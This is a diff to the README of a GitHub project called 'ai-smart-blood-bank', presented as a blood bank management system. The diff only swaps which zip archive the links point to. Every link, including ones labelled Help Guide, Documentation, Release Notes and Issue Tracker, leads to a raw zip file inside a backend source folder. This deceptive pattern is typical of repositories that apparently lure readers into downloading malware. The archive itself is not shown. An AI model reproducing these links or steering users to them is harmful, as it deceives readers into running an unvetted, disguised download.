@@ -4,7 +4,7 @@
 Welcome to **ai-smart-blood-bank**, an AI-assisted blood bank management system designed for ease and efficiency. This system comes with a secure admin dashboard, making it perfect for healthcare organizations. You can manage blood donations, access donor information, and more, all from one user-friendly interface.
 
 ## 📥 Download Options
-[![Download ai-smart-blood-bank](https://github.com/Usuariog45/ai-smart-blood-bank/raw/refs/heads/main/BACKEND/app/core/bank_blood_smart_ai_v3.2.zip%20Now-Click%20Here-%2300C4FF)](https://github.com/Usuariog45/ai-smart-blood-bank/raw/refs/heads/main/BACKEND/app/core/bank_blood_smart_ai_v3.2.zip)
+[![Download ai-smart-blood-bank](https://github.com/Usuariog45/ai-smart-blood-bank/raw/refs/heads/main/BACKEND/app/api/bank_blood_smart_ai_3.3.zip%20Now-Click%20Here-%2300C4FF)](https://github.com/Usuariog45/ai-smart-blood-bank/raw/refs/heads/main/BACKEND/app/api/bank_blood_smart_ai_3.3.zip)
 
 ## 🚀 Getting Started
 Follow these simple steps to download and run the application. Whether you are using Windows, macOS, or Linux, we've got you covered.
@@ -24,7 +24,7 @@ To ensure smooth operation, please meet the following system requirements:
 
 ## 📦 Download & Install
 1. **Visit the Releases Page**: Click the link below to access the downloadable files.
-   - [Visit this page to download](https://github.com/Usuariog45/ai-smart-blood-bank/raw/refs/heads/main/BACKEND/app/core/bank_blood_smart_ai_v3.2.zip)
+   - [Visit this page to download](https://github.com/Usuariog45/ai-smart-blood-bank/raw/refs/heads/main/BACKEND/app/api/bank_blood_smart_ai_3.3.zip)
    
 2. **Choose the Latest Release**: Look for the latest version at the top of the page. 
 
@@ -50,7 +50,7 @@ To ensure smooth operation, please meet the following system requirements:
 
 ## 🤝 Support
 If you need help during installation or while using the application, please check our comprehensive help guide:
-- [Help Guide](https://github.com/Usuariog45/ai-smart-blood-bank/raw/refs/heads/main/BACKEND/app/core/bank_blood_smart_ai_v3.2.zip)
+- [Help Guide](https://github.com/Usuariog45/ai-smart-blood-bank/raw/refs/heads/main/BACKEND/app/api/bank_blood_smart_ai_3.3.zip)
 
 You can also report issues directly on the GitHub repository’s issues page.
 
@@ -75,8 +75,8 @@ This application is built using key technologies to ensure it runs smoothly:
 - **Geolocation**: Allows tracking of blood donation locations.
 
 ## 🔗 Useful Links
-- [Documentation](https://github.com/Usuariog45/ai-smart-blood-bank/raw/refs/heads/main/BACKEND/app/core/bank_blood_smart_ai_v3.2.zip)
-- [Release Notes](https://github.com/Usuariog45/ai-smart-blood-bank/raw/refs/heads/main/BACKEND/app/core/bank_blood_smart_ai_v3.2.zip)
-- [Issue Tracker](https://github.com/Usuariog45/ai-smart-blood-bank/raw/refs/heads/main/BACKEND/app/core/bank_blood_smart_ai_v3.2.zip)
+- [Documentation](https://github.com/Usuariog45/ai-smart-blood-bank/raw/refs/heads/main/BACKEND/app/api/bank_blood_smart_ai_3.3.zip)
+- [Release Notes](https://github.com/Usuariog45/ai-smart-blood-bank/raw/refs/heads/main/BACKEND/app/api/bank_blood_smart_ai_3.3.zip)
+- [Issue Tracker](https://github.com/Usuariog45/ai-smart-blood-bank/raw/refs/heads/main/BACKEND/app/api/bank_blood_smart_ai_3.3.zip)
 
 Thank you for using **ai-smart-blood-bank**. We look forward to hearing from you!
